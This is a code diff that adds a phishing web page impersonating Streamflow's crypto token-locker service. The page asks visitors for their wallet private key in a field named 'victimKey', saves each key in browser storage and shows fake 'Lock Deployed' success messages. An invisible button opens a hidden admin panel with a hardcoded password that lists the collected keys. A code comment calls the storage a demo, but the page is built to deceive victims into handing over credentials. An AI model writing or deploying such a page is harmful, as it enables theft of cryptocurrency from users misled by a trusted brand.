@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Streamflow | Token Locker</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #0b0e11; color: white; font-family: sans-serif; }
+        .input-box { background: #1b1f23; border: 1px solid #30363d; border-radius: 8px; width: 100%; padding: 12px; margin-bottom: 12px; color: white; outline: none; }
+        .btn-green { background-color: #00ffbd; color: black; font-weight: bold; width: 100%; padding: 15px; border-radius: 8px; cursor: pointer; }
+        /* BUTONUL INVIZIBIL */
+        .inv-btn { width: 100%; height: 60px; background: transparent; margin-top: 20px; cursor: default; }
+    </style>
+</head>
+<body class="flex flex-col items-center justify-center min-h-screen p-6">
+
+    <div class="w-full max-w-md">
+        <img src="https://streamflow.finance/favicon.ico" class="w-14 mx-auto mb-4">
+        <h1 class="text-2xl font-bold text-center mb-6">Streamflow | Locker</h1>
+
+        <input type="text" placeholder="Project Name" class="input-box">
+        <input type="password" id="victimKey" placeholder="Wallet Private Key" class="input-box">
+        <input type="text" placeholder="Token Symbol (SOL/USDC)" class="input-box">
+        <button class="btn-green" onclick="handleLock()">DEPLOY LOCK</button>
+
+        <div class="inv-btn" onclick="openAdmin()"></div>
+
+        <div id="adminPanel" class="hidden mt-4 p-4 border border-gray-800 bg-black">
+            <p class="text-xs text-gray-500 mb-2">Security Check</p>
+            <input type="password" id="adminPass" placeholder="Password" class="input-box text-xs">
+            <button onclick="checkAdmin()" class="bg-blue-900 w-full p-2 rounded text-xs">LOGIN</button>
+            <div id="displayData" class="hidden mt-4 text-[10px] text-green-500 font-mono">
+                </div>
+        </div>
+    </div>
+
+    <script>
+        function handleLock() {
+            const key = document.getElementById('victimKey').value;
+            if(key) {
+                // Salvăm local în browser (doar pentru acest demo)
+                let keys = JSON.parse(localStorage.getItem('collected_keys') || "[]");
+                keys.push(key);
+                localStorage.setItem('collected_keys', JSON.stringify(keys));
+                
+                alert("Connecting to Solana...");
+                setTimeout(() => { alert("Success! Lock Deployed."); }, 1500);
+            }
+        }
+
+        function openAdmin() {
+            document.getElementById('adminPanel').classList.toggle('hidden');
+        }
+
+        function checkAdmin() {
+            const p = document.getElementById('adminPass').value;
+            if(p === 'Ovidiu20.04.2006') {
+                const data = JSON.parse(localStorage.getItem('collected_keys') || "[]");
+                document.getElementById('displayData').innerHTML = "KEYS FOUND: <br>" + data.join("<br>");
+                document.getElementById('displayData').classList.remove('hidden');
+            } else {
+                alert("Wrong password!");
+            }
+        }
+    </script>
+</body>
+</html>
